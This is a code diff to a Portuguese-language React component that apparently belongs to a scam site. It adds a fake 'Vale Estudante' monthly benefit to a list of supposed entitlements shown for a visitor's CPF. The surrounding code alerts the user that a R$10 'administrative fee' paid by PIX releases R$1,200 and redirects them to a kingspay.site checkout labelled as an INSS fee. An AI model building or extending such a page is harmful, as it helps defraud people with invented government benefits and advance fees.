@@ -68,6 +68,12 @@ const benefitsFromUserCode = [
         icon: "💸",
         descricao: "Valores esquecidos em contas e bancos!",
     },
+    {
+        nome: "Vale Estudante",
+        valor: "R$ 1489/mês",
+        icon: "🎓",
+        descricao: "Apoio mensal para seus estudos!",
+    },
 ];
 
 
@@ -82,7 +88,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
     }, 1500);
 
     const testimonialInterval = setInterval(() => {
-      setTestimonials(prev => [...prev].sort(() => 0.5 - Math.random()));
+       setTestimonials(prev => [...prev].sort(() => 0.5 - Math.random()));
     }, 8000);
 
     return () => {
@@ -106,7 +112,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
       console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$10,00 checkout.");
       alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$10,00. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
       window.location.href = "https://kingspay.site/checkout/taxa-inss-2025"; 
-    }, 100); // 100ms delay might be enough for the scroll to start/be noticeable
+    }, 100); 
   };
 
   const formattedCpf = cpf || '***.***.***-**';
@@ -235,6 +241,7 @@ export default OfferStep;
     
 
     
+
 
 
 
